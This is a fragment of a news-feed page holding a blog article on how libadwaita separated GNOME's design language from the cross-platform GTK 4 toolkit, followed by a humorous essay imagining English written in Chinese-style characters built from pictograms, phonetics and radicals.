<li><a href="#libhandy-the-predecessor">Libhandy: the Predecessor</a></li>
</ol>
</li>
<li>
<a href="#libadwaita-the-successor">Libadwaita: the Successor</a>
<ol>
<li><a href="#porting-widgets-to-libadwaita">Porting Widgets to Libadwaita</a></li>
<li><a href="#scope-of-support">Scope of Support</a></li>
</ol>
</li>
<li><a href="#state-of-gtk-4-today">State of GTK 4 Today</a></li>
<li><a href="#alternate-platforms">Alternate Platforms</a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ol>
            </nav>
          </details>
      </section>
    

    <h2 id="introduction">
  
  
    Introduction<a href="#introduction" title="Permalink to “Introduction”" aria-label="Permalink to “Introduction”">§</a>
  
  
</h2>
    

<p>Recently, the Linux Mint Blog published <a href="https://blog.linuxmint.com/?p=4675" rel="external nofollow noopener" target="_blank">Monthly News – April 2024</a>, which goes into detail about wanting to fork and maintain older GNOME apps in collaboration with other GTK-based desktop environments.</p>

<p>Despite the good intentions of the author, Clem, many readers interpreted this as an attack against GNOME. Specifically: <a href="https://gtk.org/" rel="external nofollow noopener" target="_blank">GTK</a>, <a href="https://gnome.pages.gitlab.gnome.org/libadwaita" rel="external nofollow noopener" target="_blank">libadwaita</a>, the relationship between them, and their relevance to any desktop environment or desktop operating system. Unfortunately, many of these readers seem to have a lot of difficulty understanding what GTK <em>is</em> trying to be, and how libadwaita helps.</p>

<p>In this article, we’ll look at the history of why and how libadwaita was born, the differences between GTK 4 and libadwaita in terms of scope of support, their relevance to each desktop environment and desktop operating system, and the state of GTK 4 today.</p>
<h2 id="what-is-gtk">
  
  
    What Is GTK?<a href="#what-is-gtk" title="Permalink to “What Is GTK?”" aria-label="Permalink to “What Is GTK?”">§</a>
  
  
</h2>
    

<p>First of all, what is GTK? GTK is a cross-platform widget toolkit from the GNOME Project, which means it provides interactive elements that developers can use to build their apps.</p>

<p>The latest major release of GTK is 4, which brings performance improvements over GTK 3. GTK 4 also removes several widgets that were part of the GNOME design language, which became a controversy. In the context of application design, a <em>design language</em> is the visual characteristics that are communicated to the user. Fonts, colors, shapes, forms, layouts, writing styles, spacing, etc. are all elements of the design language.<sup><a href="https://www.smashingmagazine.com/2020/03/visual-design-language-building-blocks/" rel="external nofollow noopener" target="_blank">(Source)</a></sup></p>

    

<p>In general, cross-platform toolkits tend to provide general-purpose/standard widgets, typically with a non-opinionated styling, i.e. widgets and design patterns that are used consistently across different operating systems (OSes) and desktop environments.</p>

<p>However, GTK had the unique case of bundling GNOME’s design language into GTK, which made it far from generic, leading to problems of different lexicons, mainly philosophical and technical problems.</p>
<h3 id="clash-of-philosophies">
  
  
    Clash of Philosophies<a href="#clash-of-philosophies" title="Permalink to “Clash of Philosophies”" aria-label="Permalink to “Clash of Philosophies”">§</a>
  
  
</h3>
    

<p>When we look at apps made for the GNOME desktop (will be referred to as “GNOME apps”) as opposed to non-GNOME apps, we notice that they’re distinctive: GNOME apps tend to have <a href="https://en.wikipedia.org/wiki/Hamburger_button" rel="external nofollow noopener" target="_blank">hamburger buttons</a>, larger buttons, larger padding and margins, etc., while most non-GNOME apps tend to be more compact, use <a href="https://en.wikipedia.org/wiki/Menu_bar" rel="external nofollow noopener" target="_blank">menu bars</a>, <a href="https://learn.microsoft.com/en-us/windows/apps/design/basics/titlebar-design#standard-design" rel="external nofollow noopener" target="_blank">standard title bars</a>, and many other design metaphors that may not be used in GNOME apps.</p>

<p>This is because, from a design philosophy standpoint, GNOME’s design patterns tend to go in a different direction than most apps. As a brand and product, GNOME has a design language it adheres to, which is accompanied by the GNOME <a href="https://developer.gnome.org/hig" rel="external nofollow noopener" target="_blank">Human Interface Guidelines</a> (HIG).</p>

<p>As a result, GTK and GNOME’s design language clashed together. Instead of being as general-purpose as possible, GTK as a cross-platform toolkit contained an entire design language intended to be used only by a specific desktop, thus defeating the purpose of a cross-platform toolkit.</p>

<p><em>For more information on GNOME’s design philosophy, see “<a href="https://tesk.page/2023/04/02/what-is-gnomes-philosophy/">What is GNOME’s Philosophy?</a>”.</em></p>
<h3 id="inefficient-diversion-of-resources">
  
  
    Inefficient Diversion of Resources<a href="#inefficient-diversion-of-resources" title="Permalink to “Inefficient Diversion of Resources”" aria-label="Permalink to “Inefficient Diversion of Resources”">§</a>
  
  
</h3>
    

<p>The unnecessary unification of the toolkit and design language also divided a significant amount of effort and maintenance: Instead of focusing solely on the general-purpose widgets that could be used across all desktop OSes and environments, much of the focus was on the widgets that were intended to conform to the GNOME HIG. Many of the general-purpose widgets also included features and functionality that were only relevant to the GNOME desktop, making them less general-purpose.</p>

<p>Thus, the general-purpose widgets were being implemented and improved slowly, and the large codebase also made the GNOME widgets and design language difficult to maintain, change, and adapt. In other words, almost everything was hindered by the lack of independence on both sides.</p>
<h3 id="libhandy-the-predecessor">
  
  
    Libhandy: the Predecessor<a href="#libhandy-the-predecessor" title="Permalink to “Libhandy: the Predecessor”" aria-label="Permalink to “Libhandy: the Predecessor”">§</a>
  
  
</h3>
    

<p>Because of the technical bottlenecks caused by the philosophical decisions, <a href="https://gnome.pages.gitlab.gnome.org/libhandy" rel="external nofollow noopener" target="_blank">libhandy</a> was created <a href="https://source.puri.sm/Librem5/libhandy/-/commit/d7b066dcac396ec65904a632fb91f63abe5b42cc" rel="external nofollow noopener" target="_blank">in 2017</a>, with the first experimental version released in <a href="https://source.puri.sm/Librem5/libhandy/-/commit/6b34695abbf64281f5a2879bd82fa5e8469ba7da" rel="external nofollow noopener" target="_blank">2018</a>. As described on the website, libhandy is a collection of “[b]uilding blocks for modern adaptive GNOME applications.” In other words, libhandy provides additional widgets that can be used by GNOME apps, especially those that use GTK 3. For example, <a href="https://gitlab.gnome.org/GNOME/gnome-boxes/-/blob/f253b5c9bc908c2c53ad7676394c25fd60d05410/src/meson.build#L105" rel="external nofollow noopener" target="_blank">Boxes uses libhandy</a>, and many GNOME apps that used to use GTK 3 also used libhandy.</p>

<p>However, some of the problems remained: Since libhandy was relatively new at the time, most GNOME widgets were still part of GTK 3, which continued to suffer from the consequences of merging the toolkit and design language. Furthermore, GTK 4 was released at the end of December 2020 — after libhandy. Since libhandy was created before the initial release of GTK 4, it made little sense to fully address these issues in GTK 3, especially when doing so would have caused major breakages and inconveniences for GTK, libhandy, and app developers. As such, it wasn’t worth the effort.</p>

<p>With these issues in mind, the best course of action was to introduce all these major changes and breakages in GTK 4, use libhandy as an experiment and to gain experience, and properly address these issues in a successor.</p>
<h2 id="libadwaita-the-successor">
  
  
    Libadwaita: the Successor<a href="#libadwaita-the-successor" title="Permalink to “Libadwaita: the Successor”" aria-label="Permalink to “Libadwaita: the Successor”">§</a>
  
  
</h2>
    

<p>Because of all the above problems, libadwaita was created: libhandy’s successor that will accompany GTK 4.</p>

<p>GTK 4 was initially released in <a href="https://blog.gtk.org/2020/12/16/gtk-4-0/" rel="external nofollow noopener" target="_blank">December 2020</a>, and libadwaita was released one year later, in <a href="https://blogs.gnome.org/alicem/2021/12/31/libadwaita-1-0/" rel="external nofollow noopener" target="_blank">December 2021</a>. With the experience gained from libhandy, libadwaita managed to become extensible and easy to maintain.</p>

<p>Libadwaita is a platform library accompanying GTK 4. A <em>platform library</em> is a library used to complement a specific platform. In the case of libadwaita, the platform it targets is the GNOME desktop.</p>
<h3 id="porting-widgets-to-libadwaita">
  
  
    Porting Widgets to Libadwaita<a href="#porting-widgets-to-libadwaita" title="Permalink to “Porting Widgets to Libadwaita”" aria-label="Permalink to “Porting Widgets to Libadwaita”">§</a>
  
  
</h3>
    

<p>Some GNOME widgets from GTK 3 (or earlier versions of GTK 4) were removed or deprecated in GTK 4 and were reimplemented in / transferred to libadwaita, for example:</p>
<ul>
  <li>
<del><a href="https://docs.gtk.org/gtk4/class.Dialog.html" rel="external nofollow noopener" target="_blank">GtkDialog</a></del> → <a href="https://gnome.pages.gitlab.gnome.org/libadwaita/doc/main/class.Dialog.html" rel="external nofollow noopener" target="_blank">AdwDialog</a>
</li>
  <li>
<del><a href="https://docs.gtk.org/gtk4/class.InfoBar.html" rel="external nofollow noopener" target="_blank">GtkInfoBar</a></del> → <a href="https://gnome.pages.gitlab.gnome.org/libadwaita/doc/main/class.Banner.html" rel="external nofollow noopener" target="_blank">AdwBanner</a>
</li>
</ul>

<p>These aforementioned widgets only benefited GNOME apps, as they were strictly designed to provide widgets that conformed to the GNOME HIG. Non-GNOME apps usually didn’t use these widgets, so they were practically irrelevant to everyone else.</p>

<p>In addition, libadwaita introduced several widgets as counterparts to GTK 4 to comply with the HIG:</p>
<ul>
  <li>
<a href="https://docs.gtk.org/gtk4/class.HeaderBar.html" rel="external nofollow noopener" target="_blank">GtkHeaderBar</a> → <a href="https://gnome.pages.gitlab.gnome.org/libadwaita/doc/main/class.HeaderBar.html" rel="external nofollow noopener" target="_blank">AdwHeaderBar</a>
</li>
  <li>
<a href="https://docs.gtk.org/gtk4/class.AlertDialog.html" rel="external nofollow noopener" target="_blank">GtkAlertDialog</a> → <a href="https://gnome.pages.gitlab.gnome.org/libadwaita/doc/main/class.AlertDialog.html" rel="external nofollow noopener" target="_blank">AdwAlertDialog</a>
</li>
  <li>
<a href="https://docs.gtk.org/gtk4/class.AboutDialog.html" rel="external nofollow noopener" target="_blank">GtkAboutDialog</a> → <a href="https://gnome.pages.gitlab.gnome.org/libadwaita/doc/main/class.AboutDialog.html" rel="external nofollow noopener" target="_blank">AdwAboutDialog</a>
</li>
</ul>

<p>Similarly, these aforementioned GTK 4 (the ones starting with <code>Gtk</code>) widgets are not designed to comply with the GNOME HIG. Since GTK 4 widgets are supposed to be general-purpose, they should not be platform-specific; the HIG no longer has any influence on GTK, only on the development of libadwaita.</p>
<h3 id="scope-of-support">
  
  
    Scope of Support<a href="#scope-of-support" title="Permalink to “Scope of Support”" aria-label="Permalink to “Scope of Support”">§</a>
  
  
</h3>
    

<p>The main difference between GTK 4 and libadwaita is the scope of support, specifically the priorities in terms of the GNOME desktop, and desktop environment and OS support. While the GNOME desktop is the top priority for both GTK and libadwaita, GTK 4 is nowhere near as focused on the GNOME desktop as libadwaita is. GTK 4, while opinionated, still tries to get closer to the traditional desktop metaphor by providing these general-purpose widgets, while libadwaita provides custom widgets to conform to the GNOME HIG.</p>

<p>Since libadwaita is only made for the GNOME desktop, and the GNOME desktop is primarily officially supported on Linux, libadwaita thus primarily supports Linux. In contrast, GTK is officially supported on all major operating systems (Windows, macOS, Linux). However, since GTK 4 is mostly developed by GNOME developers, it works best on Linux and <span>GNOME — hence</span> “opinionated”.</p>
<h2 id="state-of-gtk-4-today">
  
  
    State of GTK 4 Today<a href="#state-of-gtk-4-today" title="Permalink to “State of GTK 4 Today”" aria-label="Permalink to “State of GTK 4 Today”">§</a>
  
  
</h2>
    

<p>Thanks to the removal of GNOME widgets from GTK 4, GTK developers can continue to work on general-purpose widgets, without being influenced or restricted in any way by the GNOME HIG. Developers of cross-platform GTK 3 apps that rely exclusively on general-purpose widgets can be more confident that GTK 4 won’t remove these widgets, and hopefully enjoy the benefits that GTK 4 offers.</p>

<p>At the time of writing, there are several cross-platform apps that have either successfully ported to GTK 4, or are currently in the process of doing so. To name a few: <a href="https://flathub.org/apps/org.freeciv.gtk4" rel="external nofollow noopener" target="_blank">Freeciv gtk4 client</a>, <a href="https://handbrake.fr/" rel="external nofollow noopener" target="_blank">HandBrake</a>, <a href="https://inkscape.org/" rel="external nofollow noopener" target="_blank">Inkscape</a>, and <a href="https://transmissionbt.com/" rel="external nofollow noopener" target="_blank">Transmission</a>. The <a href="https://libreoffice.org/" rel="external nofollow noopener" target="_blank">LibreOffice</a> developers are working on the GTK 4 port, with the <a href="https://wiki.documentfoundation.org/Development/GTK4" rel="external nofollow noopener" target="_blank"><code>gtk4</code> VCL plugin</a> option enabled. For example, the <a href="https://archlinux.org/packages/extra/x86_64/libreoffice-fresh/" rel="external nofollow noopener" target="_blank"><code>libreoffice-fresh</code></a> package from Arch Linux has it <a href="https://gitlab.archlinux.org/archlinux/packaging/packages/libreoffice-fresh/-/blob/d5fc44b4659c0512fea49277d04ca505bd4e5299/PKGBUILD#L202" rel="external nofollow noopener" target="_blank">enabled</a>.</p>

<p>Here are screenshots of the aforementioned apps:</p>

<figure>

  <img src="https://tesk.page/assets/Articles/libadwaita-splitting-gtk-and-design-language/freeciv-gtk4.webp" loading="lazy" alt="" width="1664" height="1027">
  
    <figcaption><p><em>Freeciv gtk4 client</em> in the game view, displaying a title bar, a custom background, a menu bar, a tab view with the Chat tab selected, an entry, and a few buttons.</p>
</figcaption>
  
</figure>

<figure>

  <img src="https://tesk.page/assets/Articles/libadwaita-splitting-gtk-and-design-language/handbrake-gtk4.webp" loading="lazy" alt="" width="1245" height="766">
  
    <figcaption><p><em>HandBrake</em> in the main view, displaying a title bar, a menu bar, a horizontal toolbar below it with custom buttons, entries, popover buttons, a tab view with the Summary tab selected, containing a popover button and several checkboxes.</p>
</figcaption>
  
</figure>

<figure>

  <img src="https://tesk.page/assets/Articles/libadwaita-splitting-gtk-and-design-language/inkscape-gtk4.webp" loading="lazy" alt="" width="1850" height="1121">
  
    <figcaption><p>Development version of <em>Inkscape</em> in the main view, displaying a title bar, a menu bar, a horizontal toolbar below, vertical toolbars on the left and right, a canvas grid on the center left, a tab view on the center right with the Display Properties tab selected, and a toolbar at the bottom.</p>
</figcaption>
  
</figure>

<figure>

  <img src="https://tesk.page/assets/Articles/libadwaita-splitting-gtk-and-design-language/libreoffice-gtk4.webp" loading="lazy" alt="" width="1964" height="1180">
  
    <figcaption><p><em>LibreOffice Writer</em> with the experimental <code>gtk4</code> VCL plugin in workspace view, displaying a title bar, a menu bar, two horizontal toolbars below, a vertical toolbar on the right, a workspace grid in the middle with selected text, and a status bar at the bottom.</p>
</figcaption>
  
</figure>

<figure>

  <img src="https://tesk.page/assets/Articles/libadwaita-splitting-gtk-and-design-language/transmission-gtk4.webp" loading="lazy" alt="" width="1283" height="647">
  
    <figcaption><p><em>Transmission</em> in the main view, displaying a title bar, a menu bar, a horizontal toolbar, a filter bar, an empty field in the center of the view, and a status bar at the bottom.</p>
</figcaption>
  
</figure>
<h2 id="alternate-platforms">
  
  
    Alternate Platforms<a href="#alternate-platforms" title="Permalink to “Alternate Platforms”" aria-label="Permalink to “Alternate Platforms”">§</a>
  
  
</h2>
    

<p>While libadwaita is the most popular and widely used platform library that accompanies GTK 4, there are several alternatives to libadwaita:</p>

<ul>
  <li>
<a href="https://valadoc.org/granite-7/index.htm" rel="external nofollow noopener" target="_blank">Granite</a> is developed and maintained by <a href="https://elementary.io/brand" rel="external nofollow noopener" target="_blank">elementary, Inc.</a>, and focuses on <a href="https://elementary.io/" rel="external nofollow noopener" target="_blank">elementary OS</a> and the Pantheon desktop. Apps that use Granite can be found in the <a href="https://appcenter.elementary.io/" rel="external nofollow noopener" target="_blank">elementary AppCenter</a>.</li>
  <li>
<a href="https://docs.developers.tauos.co/libhelium/libhelium-1" rel="external nofollow noopener" target="_blank">Libhelium</a> is developed and maintained by <a href="https://fyralabs.com/" rel="external nofollow noopener" target="_blank">Fyra Labs</a>, and focuses on <a href="https://tauos.co/" rel="external nofollow noopener" target="_blank">tauOS</a>. Apps using libhelium can be found in the <a href="https://github.com/topics/libhelium" rel="external nofollow noopener" target="_blank">“libhelium” topics on GitHub</a>.</li>
</ul>

<p>Just like libadwaita, these platform libraries offer custom widgets and styling that differ from GTK and are built for their respective platforms, so it’s important to realize that <strong>GTK is meant to be built with a complementary platform library that extends its functionality <u>when targeting a specific platform</u></strong>.</p>

<p>Similarly, <a href="https://develop.kde.org/frameworks/kirigami//" rel="external nofollow noopener" target="_blank">Kirigami</a> from KDE accompanies Qt to build Plasma apps. <a href="https://mauikit.org/" rel="external nofollow noopener" target="_blank">MauiKit</a> from the Maui Project (another KDE project) also accompanies Qt, but targets <a href="https://nxos.org/" rel="external nofollow noopener" target="_blank">Nitrux</a>. <a href="https://pop-os.github.io/libcosmic/cosmic/" rel="external nofollow noopener" target="_blank">Libcosmic</a> by System76 accompanies <a href="https://iced.rs/" rel="external nofollow noopener" target="_blank">iced</a> to build COSMIC apps.</p>
<h2 id="conclusion">
  
  
    Conclusion<a href="#conclusion" title="Permalink to “Conclusion”" aria-label="Permalink to “Conclusion”">§</a>
  
  
</h2>
    

<p>A cross-platform toolkit should primarily provide general-purpose widgets. Third parties should be able to extend the toolkit as they see fit through a platform library if they want to target a specific platform.</p>

<p>As we’ve seen throughout the philosophical and technical issues with GTK, a lot of effort has gone into moving GNOME widgets from GTK 4 to libadwaita. GTK 4 will continue to provide these general-purpose widgets for apps intended to run on any desktop or OS, while platform libraries such as libadwaita, Granite and libhelium provide styling and custom widgets that respect their respective platforms.</p>

<p>Libadwaita is targeted exclusively at the GNOME ecosystem, courtesy of the GNOME HIG. Apps built with libadwaita are intended to run best on GNOME, while GTK 4 apps that don’t come with a platform library are intended to run everywhere.</p>

  </article>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[If English was written like Chinese (1999) (270 pts)]]></title>
            <link>https://zompist.com/yingzi/yingzi.htm</link>
            <guid>40565060</guid>
            <pubDate>Mon, 03 Jun 2024 17:34:42 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://zompist.com/yingzi/yingzi.htm">https://zompist.com/yingzi/yingzi.htm</a>, See on <a href="https://news.ycombinator.com/item?id=40565060">Hacker News</a></p>
<div id="readability-page-1" class="page">
<img src="https://zompist.com/yingzi/chinese.gif">

<h2>If English was written like Chinese</h2>

<hr>

<i>Also see the <a href="http://www.fatcow.com/edu/yingzi-be/">Belorussian translation</a> provided by <a href="http://www.fatcow.com/">Fatcow</a>.</i>

<hr>

<p>The English spelling system is such a pain, we'd might as well switch to <i>hanzi</i>-- Chinese characters.  How should we go about it?

</p><h3>Japanese style</h3>

<p>One way would be to use hanzi directly, asthe Japanese do.  For instance, we'd write "work" as <img src="https://zompist.com/yingzi/gang.gif">, and "ruler" as <img src="https://zompist.com/yingzi/jun.gif">.  Chinese and Japanese borrowings could be written using the original hanzi, e.g. "gung-ho" would be <img src="https://zompist.com/yingzi/gang.gif"><img src="https://zompist.com/yingzi/he.gif">, and "tycoon" as <img src="https://zompist.com/yingzi/da.gif"><img src="https://zompist.com/yingzi/jun.gif">.  

</p><p>You can already see that this is going to be tricky.  We've just given <img src="https://zompist.com/yingzi/gang.gif"> two readings, for instance-- /wrk/ and /gûng/-- and <img src="https://zompist.com/yingzi/jun.gif"> two as well-- /rulr/ and /kun/.  

</p><p>Proper names will be a problem as well.  Again, Chinese, Japanese, and Korean names already have hanzi forms-- e.g. <img src="https://zompist.com/yingzi/fayename.gif"> for the name of the bodaciously cute singer <a href="http://www.tezcat.com/~markrose/faye.html">Faye Wong</a>-- but for English names we'd have no better recourse than to spell things out using the nearest Chinese syllables.  For instance, Winston Churchill would be represented by hanzi that would be transliterated <i>Wensuteng Chuerqilu.</i>

</p><h3>Chinese style</h3>

<p>Maybe there's a better approach.  Instead of using hanzi directly, let's invent a new system-- we'll call it <i>yingzi</i>, "English characters"-- that would work for English exactly as hanzi works for Chinese.

</p><p>The basic principle will be, <b>one yingzi for a syllable with a particular meaning.</b>  So <i>two</i>, <i>to</i>, and <i>too</i> will each have their own yingzi.  (If we were creating a syllabary, by contrast, we'd write all three with the same symbol, the one for /tu/.)

</p><p>Does that mean we need a completely separate symbol for each of the thousands of possible English syllables?  Not at all.  We can simplify the task enormously with one more principle: <b>syllables that rhyme can have yingzi that are variations on a theme</b>.

</p><h3>Little pictures</h3>

<p>You've been reading for half a page and are probably wondering why I haven't yet talked about pictograms.  When do we get to draw little pictures?

</p><p>Well, now's the time.  Let's draw pictures.  For instance:

<table>
<tbody><tr>
<td><img src="https://zompist.com/yingzi/horse.gif"><br><i>horse</i>
</td><td><img src="https://zompist.com/yingzi/mount.gif"><br><i>mount</i>
</td><td><img src="https://zompist.com/yingzi/king.gif"><br><i>king</i>
</td><td><img src="https://zompist.com/yingzi/man.gif"><br><i>man</i>
</td><td><img src="https://zompist.com/yingzi/child.gif"><br><i>child</i>
</td><td><img src="https://zompist.com/yingzi/bug.gif"><br><i>bug</i>
</td><td><img src="https://zompist.com/yingzi/sun.gif"><br><i>sun</i>
</td><td><img src="https://zompist.com/yingzi/moon.gif"><br><i>moon</i>
</td><td><img src="https://zompist.com/yingzi/tree.gif"><br><i>tree</i>
</td></tr></tbody></table>

When the pictures are abstract we can call them "ideograms", but they still represent particular English morphemes:



Some of our pictures will be kind of clever.  For instance, <img src="https://zompist.com/yingzi/woods.gif"> <i>woods</i> repeats the yingzi for <i>tree</i>, while <img src="https://zompist.com/yingzi/east.gif"> <i>east</i> is a little picture of the sun rising through the trees.  <img src="https://zompist.com/yingzi/guilt.gif"> <i>guilt</i> is a picture of a man inside an enclosure.  

</p><p>Let's not go crazy, however.  We only need a thousand or so, and we'll restrict ourselves to fairly simple, one-syllable words.  We'll derive the vast majority of our yingzi from this basic stock of pictures. 

</p><h3>Phonetic classes</h3>

<p>Basically each simple yingzi will be the basis for an open-ended set of yingzi, used for a set of <b>rhyming syllables</b>.  For instance, the <i>king </i>character <img src="https://zompist.com/yingzi/king.gif"> will generate the family <i>king</i>, <i>thing, sing, sling, sting, shing(le).</i>   

</p><p>It would be awfully confusing to use <img src="https://zompist.com/yingzi/king.gif"> for all of these.  Instead we'll use it only for <i>king</i>, which will be the <b>phonetic</b> for this set, and add little signs called <b>radicals</b> to distinguish the rest.  Examples:

</p>

When we add a radical, we scrunch up the yingzi so the whole thing still fits into a square.  All characters, however complex, fit into the same size box. 

<p>"Rhyming" isn't quite accurate.  We don't want each family of words to get <i>too</i> large; so we'll restrict a single family to either voiced or unvoiced initial consonants.  

</p><p>So, <i>bring, ring, Bing, wing, zing</i> will form a separate family of yingzi, based on the character <img src="https://zompist.com/yingzi/wing.gif"> <i>wing.</i> 

</p><h3>Overlaps and secondary derivations</h3>

<p>The yingzi formed from a single phonetic will all rhyme; but not all syllables that rhyme will necessarily have the same yingzi.  This is largely because we started with a set of pictograms chosen for their pictorial rather than phonetic qualities; but it also adds visual distinctions to the script, and thus aids the reader.  (It rather burdens the writer; but heck, everyone does a lot more reading than writing.) 

</p><p>For instance, the phonetic <img src="https://zompist.com/yingzi/not.gif"> <i>un- </i>will be used for <i>fun, ton, pun, thun(der), Hun,</i> etc.  But <i>sun</i> will have its own yingzi, <img src="https://zompist.com/yingzi/sun.gif">, and this will be used for <i>son, shun, stun, spun</i>.  For instance, <i>sun</i> plus the <i>man</i> radical makes <img src="https://zompist.com/yingzi/son.gif"> <i>son</i>, and <i>sun </i>with the <i>fight</i> radical is used for <img src="https://zompist.com/yingzi/shun.gif"> <i>shun</i>.

</p><p>Moreover, a compound yingzi may itself be used as a phonetic with its own set of yingzi.  The <i>shun</i> character <img src="https://zompist.com/yingzi/shun.gif">, for instance, will be used with the <i>work</i> radical to form <img src="https://zompist.com/yingzi/tion.gif"> <i>-tion</i>, used to spell this common suffix, as in <img src="https://zompist.com/yingzi/sect.gif"><img src="https://zompist.com/yingzi/tion.gif"> <i>section</i>.

</p><h3>Radicals</h3>

<p>Where do the radicals come from?  For the most part they are either simple characters (e.g <i>king, work</i>), or abbreviations of characters; for instance the character <img src="https://zompist.com/yingzi/net.gif"> <i>net</i> is abbreviated to <img src="https://zompist.com/yingzi/netr.gif"> when used as a radical.

</p><p>The set of radicals is not unlimited; there is in fact a <b>fixed set</b> of 214 of them.  The total number of yingzi that belong to one phonetic set is thus absolutely limited to 214.  No set will actually have this number of yingzi, though some will have a few dozen.

</p><p>(However, the potential number of yingzi is still unlimited, because we can always choose a compound yingzi as a new phonetic, and generate a new set of rhyming yingzi from it.)

</p><p>Because the set of radicals is limited, a really good radical will not always be available to distinguish the yingzi in a rhyming set.  We'll just choose the best one we can.  In addition, when choosing radicals we will rely on the <b>etymological</b> meaning of a word, which may not always match its current meaning.  For instance, the word <i>villain</i> originally meant <i>peasant</i>, and so the sign for <i>vill-</i> <img src="https://zompist.com/yingzi/vill.gif"> uses the <i>field</i> radical (added to the phonetic <i>bill</i>). 

</p><p>The yingzi that use a particular radical will form a class of their own-- a sort of <b>meaning class</b>.  We can consider the entire English language to be divided into 214 meaning categories.  For instance, every yingzi that uses the <i>bug</i> radical will have something to do (at least etymologically) with insects or reptiles.  However, since the number of radicals is so limited, and because the choice of radical is sometimes quirky, the resulting sets will be rather vague and eccentric.

</p><h3>Guessing at an unknown character</h3>

<p>There will be tens of thousands of yingzi; but we must not let this frighten us.  There are tens of thousands of conventional spellings, too, but despite what the wiseacres say, it would be absurd to say that there's no logic to English orthography at all.  Likewise, the yingzi themselves are not the basic graphical units or <b>graphemes</b> of the writing system; the phonetics and radicals are.

</p><p>Readers can make use of this fact to guess the pronunciation of an unknown character.  For instance, <img src="https://zompist.com/yingzi/curse.gif"> is a straightforward combination of the <img src="https://zompist.com/yingzi/speak.gif"> <i>speech </i>radical with the phonetic <img src="https://zompist.com/yingzi/purse.gif"> <i>purse</i>.  A type of speaking that rhymes with purse-- <i>curse</i>, of course.

</p><p>Or, <img src="https://zompist.com/yingzi/wilt.gif">, a combination of the <i>plant</i> radical <img src="https://zompist.com/yingzi/plant.gif"> with the <i>guilt </i>phonetic <img src="https://zompist.com/yingzi/guilt.gif">.  Something about plants that rhymes with guilt?  This one is a bit harder-- <i>wilt</i>.

</p><p><img src="https://zompist.com/yingzi/peach.gif"> -- a plant (radical <i> plant</i>) that rhymes with <img src="https://zompist.com/yingzi/speak.gif"> <i>speech</i>-- is easy: <i>peach</i>.  But note that <i>speech</i>, which we used as a radical above, is used as a phonetic here. 

</p><p>Since there are many more phonetics than radicals, the <b>information content</b> of the radical is much less than that of the phonetic.  If you knew only the radical for an unknown character, you can only narrow down the meaning to 1/214 of the lexicon; if you knew only the phonetic, you could narrow it down much further, since there are more than a thousand phonetics. 

</p><h3>Polysyllabic words</h3>

<p>Where possible we will divide a word into morphemes.  For instance <i>outsider</i> breaks into <i>out + side + -er</i>; reshipment is <i>re- + ship + -ment</i>.

</p><p>How do we handle morphemes of more than one syllable?  We simply create a yingzi for each syllable.  For instance, <i>person</i> would be expressed as <img src="https://zompist.com/yingzi/pers.gif"><img src="https://zompist.com/yingzi/son.gif">.  The first character is based on <img src="https://zompist.com/yingzi/per.gif"> <i>per</i>, with the addition of the <i>man</i> radical; the second is <img src="https://zompist.com/yingzi/sun.gif"> <i>sun</i> with the addition of the same radical.

</p><p>A polysyllabic morpheme, in fact, can generally be recognized because all the syllables have the same radical.  For instance, <img src="https://zompist.com/yingzi/insect.gif"> <i>insect</i> consists of <i>in </i>and <i> sect</i>, each with the addition of the <i>bug</i> radical.  (Note that <i>sect</i> is itself a compound character, formed from the <i>rite</i> radical with the <i>specked</i> phonetic.)

</p><h3>Inflections</h3>

<p>How about inflections that don't form a full syllable, such as plural <i>-s</i>?  It would be pretty tiresome, even with the add-a-radical trick, to create thousands of yingzi for syllables that just happen to have a final <i>-s</i>.  

</p><p>Note, however, that the plural morpheme sometimes takes up its own syllable, as in <i>grasses</i>, <i>rashes</i>.  So why not use the yingzi for <i>is</i>, which is <img src="https://zompist.com/yingzi/is.gif">?  Of course, <i>is</i> and <i>-s</i> are both pretty common, so we should add a little dot to the character to represent final -s: <img src="https://zompist.com/yingzi/s.gif">  So <i>peach</i> is <img src="https://zompist.com/yingzi/peach.gif">, <i>peaches</i> is <img src="https://zompist.com/yingzi/peach.gif"><img src="https://zompist.com/yingzi/s.gif">; <i>sun</i> is <img src="https://zompist.com/yingzi/sun.gif">, <i>suns</i> is <img src="https://zompist.com/yingzi/sun.gif"><img src="https://zompist.com/yingzi/s.gif">.  We can use a similar strategy for other inflections.

</p><h3>Foreign words</h3>

<p>Very old borrowings (e.g. the mass of words borrowed in medieval and Renaissance times from French and Latin) will be treated like native words.  We've already seen examples like <i><peach> peach, <vill><in-p> villain, <in+sect> insect, and <per><son> person.</son></per></in+sect></in-p></vill></peach></i>

</p><p>Words borrowed more recently, however, won't get their own radical+phonetic compounds.  Instead we'll represent them, syllable by syllable, using the nearest existing characters.  For instance, <i>Peking</i> will be represented as <img src="https://zompist.com/yingzi/seeg.gif"><img src="https://zompist.com/yingzi/king.gif">.  The first character is the first syllable of <i>pecan</i> (that is, <i>pe-;</i> phonetic <i>see</i>, radical <i>gourd</i>), and the second is the word <i>king.  </i>The name <a name="fellini"><i>Fellini</i></a> will be written <img src="https://zompist.com/yingzi/fell.gif"><img src="https://zompist.com/yingzi/bean.gif"><img src="https://zompist.com/yingzi/knee.gif">, composed of the yinzi <i>fell, lean, knee</i>.  (You may amuse yourself working out <a href="#answers">what the phonetics and radicals are</a> for these three characters.)

</p><h3>Dictionaries</h3>

<p>English dictionaries would no longer be arranged alphabetically, of course, since we're no longer using an alphabet.  They'll be organized <b>by radical</b>.

</p><p>The 214 radicals are ordered according to the number of strokes needed to draw them.  Radicals of one stroke (e.g. <img src="https://zompist.com/yingzi/one.gif"> <i>one</i> or <img src="https://zompist.com/yingzi/per.gif"> <i>per</i> ) come first, followed by radicals of two strokes (e.g. <img src="https://zompist.com/yingzi/not.gif"> <i>un-</i>), and so on, up to monstrosities like <img src="https://zompist.com/yingzi/toad.gif"> <i>toad</i>, which has 20 strokes. 

</p><p>The section for each radical is also organized by stroke number.  Under the <i>plant</i> radical, for instance, the first entry is <img src="https://zompist.com/yingzi/plant.gif"> <i>plant</i> itself, followed by characters with one extra stroke (like <img src="https://zompist.com/yingzi/dron.gif"><i> dron</i>, the last character in rhododendron), then characters with two strokes, and so on (up to <img src="https://zompist.com/yingzi/toads.gif">, the first character in <i>toadstool</i>).

